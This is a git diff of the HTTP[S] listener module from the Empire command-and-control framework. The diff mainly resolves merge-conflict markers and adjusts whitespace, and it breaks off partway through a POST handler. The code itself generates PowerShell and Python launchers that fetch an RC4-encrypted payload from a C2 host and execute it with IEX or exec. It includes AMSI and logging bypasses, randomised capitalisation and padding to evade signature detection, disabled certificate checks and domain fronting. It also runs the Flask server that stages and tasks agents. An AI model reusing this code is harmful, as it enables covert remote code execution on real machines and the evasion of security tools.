@@ -26,26 +26,26 @@ from lib.common import bypasses
 
 
 class Listener(object):
-    
+
     def __init__(self, mainMenu, params=[]):
-        
+
         self.info = {
             'Name': 'HTTP[S]',
-            
+
             'Author': ['@harmj0y'],
-            
+
             'Description': ('Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.'),
-            
+
             'Category': ('client_server'),
-            
+
             'Comments': []
         }
-        
+
         # any options needed by the stager, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            
+
             'Name': {
                 'Description': 'Name for the listener.',
                 'Required': True,
@@ -152,32 +152,32 @@ class Listener(object):
                 'Value': '#general'
             }
         }
-        
+
         # required:
         self.mainMenu = mainMenu
         self.threads = {}
-        
+
         # optional/specific for this module
         self.app = None
         self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]
-        
+
         # set the default staging key to the controller db default
         self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
-        
+
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0, 64)
-        
+
         self.session_cookie = ''
-        
+
         # check if the current session cookie not empty and then generate random cookie
         if self.session_cookie == '':
             self.options['Cookie']['Value'] = self.generate_cookie()
-    
+
     def default_response(self):
         """
         Returns an IIS 7.5 404 not found page.
         """
-        
+
         return '\n'.join([
             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
             '<html xmlns="http://www.w3.org/1999/xhtml">',
@@ -210,12 +210,12 @@ class Listener(object):
             '</html>',
             ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
         ])
-    
+
     def index_page(self):
         """
         Returns a default HTTP server page.
         """
-        
+
         return '\n'.join([
             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
             '<html xmlns="http://www.w3.org/1999/xhtml">',
@@ -250,14 +250,14 @@ class Listener(object):
             '</body>',
             '</html>',
         ])
-    
+
     def validate_options(self):
         """
         Validate all options for this listener.
         """
-        
+
         self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]
-        
+
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                 print(helpers.color("[!] Option \"%s\" is required." % (key)))
@@ -267,7 +267,7 @@ class Listener(object):
             print(helpers.color("[!] HTTPS selected but no CertPath specified."))
             return False
         return True
-    
+
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
                           proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
                           listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
@@ -276,10 +276,10 @@ class Listener(object):
         """
         if not language:
             print(helpers.color('[!] listeners/http generate_launcher(): no language specified!'))
-        
+
         if listenerName and (listenerName in self.threads) and (
                 listenerName in self.mainMenu.listeners.activeListeners):
-            
+
             # extract the set options for this instantiated listener
             listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
             host = listenerOptions['Host']['Value']
@@ -289,20 +289,16 @@ class Listener(object):
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
-            
+
             cookie = listenerOptions['Cookie']['Value']
             # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
             if cookie == '':
                 generate = self.generate_cookie()
                 listenerOptions['Cookie']['Value'] = generate
                 cookie = generate
-            
+
             if language.startswith('po'):
                 # PowerShell
-<<<<<<< HEAD
-=======
-                
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
 
                 if safeChecks.lower() == 'true':
@@ -318,7 +314,7 @@ class Listener(object):
                         stager += bypasses.AMSIBypass2()
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
-                
+
                 stager += helpers.randomize_capitalization(
                     "$" + helpers.generate_random_script_var_name("wc") + "=New-Object System.Net.WebClient;")
                 if userAgent.lower() == 'default':
@@ -328,17 +324,11 @@ class Listener(object):
                 if 'https' in host:
                     # allow for self-signed certificates for https connections
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-                
+
                 if userAgent.lower() != 'none':
-<<<<<<< HEAD
                     stager += helpers.randomize_capitalization(
                         "$" + helpers.generate_random_script_var_name("wc") + '.Headers.Add(')
                     stager += "'User-Agent',$u);"
-=======
-                    stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
-                    stager += "'User-Agent',$u);"
-
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                     if proxy.lower() != 'none':
                         if proxy.lower() == 'default':
                             stager += helpers.randomize_capitalization("$" + helpers.generate_random_script_var_name(
@@ -382,7 +372,7 @@ class Listener(object):
                             host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                         else:
                             host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
-                
+
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
@@ -393,16 +383,8 @@ class Listener(object):
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL',
                                                              meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-<<<<<<< HEAD
                 stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
                 # Add custom headers if any
-=======
-
-                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-                cookieString = "{}={};".format(cookie, b64RoutingPacket)
-                
-                #Add custom headers if any
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                 if customHeaders != []:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
@@ -410,36 +392,19 @@ class Listener(object):
                         # If host header defined, assume domain fronting is in use and add a call to the base URL first
                         # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                         if headerKey.lower() == "host":
-<<<<<<< HEAD
                             stager += helpers.randomize_capitalization(
                                 "try{$ig=$" + helpers.generate_random_script_var_name(
                                     "wc") + ".DownloadData($ser)}catch{};")
-                        
+
                         stager += helpers.randomize_capitalization(
                             "$" + helpers.generate_random_script_var_name("wc") + ".Headers.Add(")
-=======
-                            stager += helpers.randomize_capitalization("try{$ig=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser)}catch{};")
-
-                        if headerKey.lower() == "cookie":
-                            cookieString += "{};".format(headerValue)
-                            continue
-
-                        stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
                 # add the RC4 packet to a cookie
-<<<<<<< HEAD
                 stager += helpers.randomize_capitalization(
                     "$" + helpers.generate_random_script_var_name("wc") + ".Headers.Add(")
                 stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket.decode('UTF-8'))
                 stager += helpers.randomize_capitalization(
                     "$data=$" + helpers.generate_random_script_var_name("wc") + ".DownloadData($ser+$t);")
-=======
-                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
-                stager += "\"Cookie\",\"%s\");" % (cookieString)
-
-                stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
@@ -451,14 +416,14 @@ class Listener(object):
                 else:
                     # otherwise return the case-randomized stager
                     return stager
-            
+
             if language.startswith('py'):
                 # Python
                 launcherBase = 'import sys;'
                 if "https" in host:
                     # monkey patch ssl woohooo
                     launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
-                
+
                 try:
                     if safeChecks.lower() == 'true':
                         launcherBase += "import re, subprocess;"
@@ -470,49 +435,30 @@ class Listener(object):
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
                     print(helpers.color(p, color='red'))
-                
+
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
-                
+
                 launcherBase += "import urllib.request as urllib;\n"
                 launcherBase += "UA='%s';" % (userAgent)
                 launcherBase += "server='%s';t='%s';" % (host, stage0)
-                
+
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON',
                                                              meta='STAGE0', additional='None', encData='')
 
-<<<<<<< HEAD
                 b64RoutingPacket = base64.b64encode(routingPacket).decode('UTF-8')
-                
+
                 launcherBase += "req=urllib.Request(server+t);\n"
-=======
-                launcherBase += "req=urllib2.Request(server+t);\n"
-                # add the RC4 packet to a cookie
-                launcherBase += "req.add_header('User-Agent',UA);\n"
-                cookieString = "{}={};".format(cookie,b64RoutingPacket)
-                
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
 
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
-<<<<<<< HEAD
                         # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
-=======
-
-                        if headerKey.lower() == "cookie":
-                            cookieString += "{};".format(headerValue)
-                            continue
-
-                        #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                         launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
-                
-                launcherBase += "req.add_header('Cookie',\"%s\");\n" % (cookieString)
 
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
@@ -527,7 +473,7 @@ class Listener(object):
 
                             # add the RC4 packet to a cookie
                             launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
-                            b64RoutingPacket)
+                                b64RoutingPacket)
                         else:
                             launcherBase += "proxy_auth_handler = urllib.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
@@ -537,22 +483,22 @@ class Listener(object):
 
                             # add the RC4 packet to a cookie
                             launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (
-                            b64RoutingPacket)
+                                b64RoutingPacket)
                     else:
                         launcherBase += "o = urllib.build_opener(proxy);\n"
                 else:
                     launcherBase += "o = urllib.build_opener();\n"
-                
+
                 # install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib.install_opener(o);\n"
-                
+
                 # download the stager and extract the IV
-                
+
                 launcherBase += "a=urllib.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
                 launcherBase += "key=IV+'%s'.encode('UTF-8');" % (stagingKey)
-                
+
                 # RC4 decryption
                 launcherBase += "S,j,out=list(range(256)),0,[]\n"
                 launcherBase += "for i in list(range(256)):\n"
@@ -565,7 +511,7 @@ class Listener(object):
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                 launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
                 launcherBase += "exec(''.join(out))"
-                
+
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
                     if isinstance(launchEncoded, bytes):
@@ -575,24 +521,24 @@ class Listener(object):
                     return launcher
                 else:
                     return launcherBase
-            
+
             else:
                 print(helpers.color(
                     "[!] listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."))
-        
+
         else:
             print(helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!"))
-    
+
     def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="",
                         language=None):
         """
         Generate the stager code needed for communications with this listener.
         """
-        
+
         if not language:
             print(helpers.color('[!] listeners/http generate_stager(): no language specified!'))
             return None
-        
+
         profile = listenerOptions['DefaultProfile']['Value']
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         launcher = listenerOptions['Launcher']['Value']
@@ -601,22 +547,22 @@ class Listener(object):
         killDate = listenerOptions['KillDate']['Value']
         host = listenerOptions['Host']['Value']
         customHeaders = profile.split('|')[2:]
-        
+
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
         stage2 = random.choice(uris)
-        
+
         if language.lower() == 'powershell':
-            
+
             # read in the stager base
             f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
             stager = f.read()
             f.close()
-            
+
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
-            
+
             # Patch in custom Headers
             remove = []
             if customHeaders != []:
@@ -631,24 +577,23 @@ class Listener(object):
             # patch in working hours, if any
             if workingHours != "":
                 stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
-            
+
             # Patch in the killdate, if any
             if killDate != "":
                 stager = stager.replace('REPLACE_KILLDATE', killDate)
-            
+
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
             stager = stager.replace('index.jsp', stage1)
             stager = stager.replace('index.php', stage2)
-            
-            
+
             randomizedStager = ''
             # forces inputs into a bytestring to ensure 2/3 compatibility
             stagingKey = stagingKey.encode('UTF-8')
-            #stager = stager.encode('UTF-8')
-            #randomizedStager = randomizedStager.encode('UTF-8')
-            
+            # stager = stager.encode('UTF-8')
+            # randomizedStager = randomizedStager.encode('UTF-8')
+
             for line in stager.split("\n"):
                 line = line.strip()
                 # skip commented line
@@ -658,7 +603,7 @@ class Listener(object):
                         randomizedStager += helpers.randomize_capitalization(line)
                     else:
                         randomizedStager += line
-            
+
             if obfuscate:
                 randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager,
                                                      obfuscationCommand=obfuscationCommand)
@@ -673,14 +618,14 @@ class Listener(object):
             else:
                 # otherwise just return the case-randomized stager
                 return randomizedStager
-        
+
         elif language.lower() == 'python':
             template_path = [
                 os.path.join(self.mainMenu.installPath, '/data/agent/stagers'),
                 os.path.join(self.mainMenu.installPath, './data/agent/stagers')]
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template('http.py')
-            
+
             template_options = {
                 'working_hours': workingHours,
                 'kill_date': killDate,
@@ -704,20 +649,20 @@ class Listener(object):
             else:
                 # otherwise return the standard stager
                 return stager
-        
+
         else:
             print(helpers.color(
                 "[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
-    
+
     def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
         """
         Generate the full agent code needed for communications with this listener.
         """
-        
+
         if not language:
             print(helpers.color('[!] listeners/http generate_agent(): no language specified!'))
             return None
-        
+
         language = language.lower()
         delay = listenerOptions['DefaultDelay']['Value']
         jitter = listenerOptions['DefaultJitter']['Value']
@@ -726,20 +671,20 @@ class Listener(object):
         killDate = listenerOptions['KillDate']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response().encode('UTF-8'))
-        
+
         if language == 'powershell':
-            
+
             f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
             code = f.read()
             f.close()
-            
+
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
             code = code.replace('REPLACE_COMMS', commsCode)
-            
+
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
-            
+
             # patch in the delay, jitter, lost limit, and comms profile
             code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
             code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
@@ -747,27 +692,28 @@ class Listener(object):
                 '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                 "$Profile = \"" + str(profile) + "\"")
             code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "' + b64DefaultResponse.decode('UTF-8') + '"')
-            
+            code = code.replace('$DefaultResponse = ""',
+                                '$DefaultResponse = "' + b64DefaultResponse.decode('UTF-8') + '"')
+
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
             if obfuscate:
                 code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
             return code
-        
+
         elif language == 'python':
             f = open(self.mainMenu.installPath + "./data/agent/agent.py")
             code = f.read()
             f.close()
-            
+
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
             code = code.replace('REPLACE_COMMS', commsCode)
-            
+
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
-            
+
             # patch in the delay, jitter, lost limit, and comms profile
             code = code.replace('delay = 60', 'delay = %s' % (delay))
             code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
@@ -777,51 +723,33 @@ class Listener(object):
             code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
             code = code.replace('defaultResponse = base64.b64decode("")',
                                 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse.decode("UTF-8")))
-            
+
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
             if workingHours != "":
                 code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
-            
+
             return code
         else:
             print(helpers.color(
                 "[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
-    
+
     def generate_comms(self, listenerOptions, language=None):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
         This is so agents can easily be dynamically updated for the new listener.
         """
-<<<<<<< HEAD
-        
-=======
 
-        profile = listenerOptions['DefaultProfile']['Value']
-        customHeaders = profile.split('|')[2:]
-        cookieString = ""
-
-        if customHeaders != []:
-            for header in customHeaders:
-                headerKey = header.split(':')[0]
-                headerValue = header.split(':')[1]
-
-                if headerKey.lower() == "cookie":
-                    cookieString += "{};".format(headerValue)
-                    
-        cookie = listenerOptions['Cookie']['Value']
-
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
         if language:
             if language.lower() == 'powershell':
-                
+
                 updateServers = """
                     $Script:ControlServers = @("%s");
                     $Script:ServerIndex = 0;
                 """ % (listenerOptions['Host']['Value'])
-                
+
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
@@ -835,13 +763,6 @@ class Listener(object):
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
-                                #if there is an additional custom cookie value, add it to the webclient object.
-                                if($script:Headers['Cookie'] -ne $null) {
-                                    $cookieValueString = "$RoutingCookie;$($script:Headers['Cookie']);"
-                                }
-                                else {
-                                    $cookieValueString = $RoutingCookie
-                                }
                                 # build the web request object
                                 $""" + helpers.generate_random_script_var_name("wc") + """ = New-Object System.Net.WebClient
 
@@ -852,20 +773,12 @@ class Listener(object):
                                     $""" + helpers.generate_random_script_var_name("wc") + """.Proxy = $Script:Proxy;
                                 }
 
-<<<<<<< HEAD
                                 $""" + helpers.generate_random_script_var_name("wc") + """.Headers.Add("User-Agent",$script:UserAgent)
                                 $script:Headers.GetEnumerator() | % {$""" + helpers.generate_random_script_var_name(
                     "wc") + """.Headers.Add($_.Name, $_.Value)}
                                 $""" + helpers.generate_random_script_var_name(
                     "wc") + """.Headers.Add("Cookie",\"""" + self.session_cookie + """session=$RoutingCookie")
 
-=======
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Cookie",\"""" + cookie + """=$cookieValueString")
-                                
-                                
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
                                 $result = $""" + helpers.generate_random_script_var_name("wc") + """.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
@@ -904,15 +817,10 @@ class Listener(object):
                                     $""" + helpers.generate_random_script_var_name("wc") + """.Proxy = $Script:Proxy;
                                 }
 
-<<<<<<< HEAD
                                 $""" + helpers.generate_random_script_var_name("wc") + """.Headers.Add('User-Agent', $Script:UserAgent)
                                 $Script:Headers.GetEnumerator() | ForEach-Object {$""" + helpers.generate_random_script_var_name(
                     "wc") + """.Headers.Add($_.Name, $_.Value)}
 
-=======
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                                 try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random
@@ -929,12 +837,12 @@ class Listener(object):
                         }
                     }
                 """
-                
+
                 return updateServers + getTask + sendMessage
-            
+
             elif language.lower() == 'python':
                 updateServers = "server = '%s'\n" % (listenerOptions['Host']['Value'])
-                
+
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
                 sendMessage = """
@@ -953,22 +861,16 @@ def send_message(packets=None):
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-            
+
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
         #   meta TASKING_REQUEST = 4     
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-<<<<<<< HEAD
         b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
         headers['Cookie'] = \"""" + self.session_cookie + """session=%s" % (b64routingPacket)
-=======
-        b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = \"""" + cookie + """=%s;{}" % (b64routingPacket)
-
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
-    
+
     try:
         data = (urllib.urlopen(urllib.Request(requestUri, data, headers))).read()
         return ('200', data)
@@ -978,7 +880,7 @@ def send_message(packets=None):
         missedCheckins = missedCheckins + 1
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
-            pass
+            sys.exit(0)
 
         return (HTTPError.code, '')
 
@@ -987,41 +889,40 @@ def send_message(packets=None):
         missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
     return ('', '')
-""".format(cookieString)
+"""
                 return updateServers + sendMessage
-            
+
             else:
                 print(helpers.color(
                     "[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
         else:
             print(helpers.color('[!] listeners/http generate_comms(): no language specified!'))
-    
+
     def start_server(self, listenerOptions):
         """
         Threaded function that actually starts up the Flask server.
         """
-        
+
         # make a copy of the currently set listener options for later stager/agent generation
         listenerOptions = copy.deepcopy(listenerOptions)
-        
+
         # suppress the normal Flask output
         log = logging.getLogger('werkzeug')
         log.setLevel(logging.ERROR)
-        
+
         bindIP = listenerOptions['BindIP']['Value']
         host = listenerOptions['Host']['Value']
         port = listenerOptions['Port']['Value']
-        session_cookie = listenerOptions['Cookie']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
         stagerURI = listenerOptions['StagerURI']['Value']
         userAgent = self.options['UserAgent']['Value']
         listenerName = self.options['Name']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-        
+
         app = Flask(__name__)
         self.app = app
-        
+
         @app.route('/download/<stager>')
         def send_stager(stager):
             if 'po' in stager:
@@ -1036,7 +937,7 @@ def send_message(packets=None):
                 return launcher
             else:
                 return make_response(self.default_response(), 404)
-        
+
         @app.before_request
         def check_ip():
             """
@@ -1051,7 +952,7 @@ def send_message(packets=None):
                 })
                 dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                 return make_response(self.default_response(), 404)
-        
+
         @app.after_request
         def change_header(response):
             "Modify the headers response server."
@@ -1060,7 +961,7 @@ def send_message(packets=None):
                 value = key.split(":")
                 response.headers[value[0]] = value[1]
             return response
-        
+
         @app.after_request
         def add_proxy_headers(response):
             "Add HTTP headers to avoid proxy caching."
@@ -1068,26 +969,26 @@ def send_message(packets=None):
             response.headers['Pragma'] = "no-cache"
             response.headers['Expires'] = "0"
             return response
-        
+
         @app.route('/')
         @app.route('/index.html')
         def serve_index():
             """
             Return default server web page if user navigates to index.
             """
-            
+
             static_dir = self.mainMenu.installPath + "data/misc/"
             return make_response(self.index_page(), 200)
-        
+
         @app.route('/welcome.png')
         def serve_index_helper():
             """
             Serves image loaded by index page.
             """
-            
+
             static_dir = self.mainMenu.installPath + "data/misc/"
             return send_from_directory(static_dir, 'welcome.png')
-        
+
         @app.route('/<path:request_uri>', methods=['GET'])
         def handle_get(request_uri):
             """
@@ -1097,7 +998,7 @@ def send_message(packets=None):
             and when the agent requests taskings.
             """
             clientIP = request.remote_addr
-            
+
             listenerName = self.options['Name']['Value']
             message = "[*] GET request for {}/{} from {}".format(request.host, request_uri, clientIP)
             signal = json.dumps({
@@ -1105,15 +1006,15 @@ def send_message(packets=None):
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-            
+
             routingPacket = None
             cookie = request.headers.get('Cookie')
-            
+
             if cookie and cookie != '':
                 try:
                     # see if we can extract the 'routing packet' from the specified cookie location
                     # NOTE: this can be easily moved to a paramter, another cookie value, etc.
-                    if session_cookie in cookie:
+                    if self.session_cookie in cookie:
                         listenerName = self.options['Name']['Value']
                         message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
                         signal = json.dumps({
@@ -1123,25 +1024,14 @@ def send_message(packets=None):
                         dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                         cookieParts = cookie.split(';')
                         for part in cookieParts:
-<<<<<<< HEAD
                             if part.startswith(self.session_cookie):
                                 base64RoutingPacket = part[part.find('=') + 1:]
-=======
-                            if part.startswith(session_cookie):
-                                base64RoutingPacket = part[part.find('=')+1:]
->>>>>>> 883ee661d1bbc72920102054e8bba00515bff9e0
                                 # decode the routing packet base64 value in the cookie
                                 routingPacket = base64.b64decode(base64RoutingPacket)
                 except Exception as e:
-                    message = "[*] Failed to obtain routing packet: {}".format(str(e))
-                    signal = json.dumps({
-                        'print': False,
-                        'message': message
-                    })
-                    dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                     routingPacket = None
                     pass
-            
+
             if routingPacket:
                 # parse the routing packet and process the results
 
@@ -1166,7 +1056,7 @@ def send_message(packets=None):
                                                              obfuscate=self.mainMenu.obfuscate,
                                                              obfuscationCommand=self.mainMenu.obfuscateCommand)
                                 return make_response(stage, 200)
-                            
+
                             elif results.startswith(b'ERROR:'):
                                 listenerName = self.options['Name']['Value']
                                 message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(
@@ -1176,14 +1066,14 @@ def send_message(packets=None):
                                     'message': message
                                 })
                                 dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                                
+
                                 if b'not in cache' in results:
                                     # signal the client to restage
                                     print(helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP)))
                                     return make_response(self.default_response(), 401)
                                 else:
                                     return make_response(self.default_response(), 200)
-                            
+
                             else:
                                 # actual taskings
                                 listenerName = self.options['Name']['Value']
@@ -1199,7 +1089,7 @@ def send_message(packets=None):
                             return make_response(self.default_response(), 200)
                 else:
                     return make_response(self.default_response(), 200)
-            
+
             else:
                 listenerName = self.options['Name']['Value']
                 message = "[!] {} requested by {} with no routing packet.".format(request_uri, clientIP)
@@ -1209,7 +1099,7 @@ def send_message(packets=None):
                 })
                 dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                 return make_response(self.default_response(), 200)
-        
+
         @app.route('/<path:request_uri>', methods=['POST'])
         def handle_post(request_uri):
             """
@@ -1217,9 +1107,9 @@ def send_message(packets=None):
             """
             stagingKey = listenerOptions['StagingKey']['Value']
             clientIP = request.remote_addr
-            
+
             requestData = request.get_data()
-            
+
             listenerName = self.options['Name']['Value']
             message = "[*] POST request data length from {} : {}".format(clientIP, len(requestData))
             signal = json.dumps({
@@ -1227,35 +1117,7 @@ def send_message(packets=None):
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-<<<<<<< HEAD
-            
-=======
 
-            listenerName = self.options['Name']['Value']
-            try:
-                cookie = request.headers.get('Cookie')
-                if cookie and cookie != '':
-
-                    # see if we can extract the 'routing packet' from the specified cookie location
-                    # NOTE: this can be easily moved to a paramter, another cookie value, etc.
-                    
-                    message = "[*] POST cookie value from {} : {}".format(clientIP, cookie)
-                    signal = json.dumps({
-                        'print': False,
-                        'message': message
-                    })
-                    dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                
-            except Exception as e:
-                
